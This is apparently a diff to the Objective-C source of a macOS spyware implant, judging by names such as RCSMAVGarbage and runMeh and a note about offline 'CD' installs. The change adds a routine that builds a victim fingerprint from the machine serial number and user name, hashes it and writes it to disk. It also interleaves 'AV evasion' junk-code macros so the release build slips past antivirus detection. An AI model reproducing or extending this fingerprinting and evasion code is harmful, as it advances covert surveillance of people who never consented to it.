@@ -50,6 +50,7 @@
 
 #import "NSApplication+SystemVersion.h"
 #import "NSMutableData+SHA1.h"
+#import "NSData+SHA1.h"
 
 #import "RCSMAVGarbage.h"
 
@@ -4050,6 +4051,45 @@ void decryptAndSaveIm()
     return TRUE;
 }
 
+- (void)saveInstance
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  CFStringRef serialNumber;
+  getSystemSerialNumber(&serialNumber);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
+  NSMutableString *_instanceID = [[NSMutableString alloc] initWithString: (NSString *)serialNumber];
+  CFRelease(serialNumber);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
+  NSString *userName = NSUserName();
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
+  [_instanceID appendString: userName];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
+  NSData *instanceID = [_instanceID sha1Hash];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
+  [_instanceID release];
+  
+  [instanceID writeToFile:INSTANCEID_FILENAME atomically:YES];
+  
+  [pool release];
+  
+}
+
 - (BOOL)runMeh
 {
     NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
@@ -4084,6 +4124,9 @@ void decryptAndSaveIm()
     {
         return NO;
     }
+  
+    // save instanceID for offline CD purpose
+    [self saveInstance];
   
     resolveQuartzFunc();
   
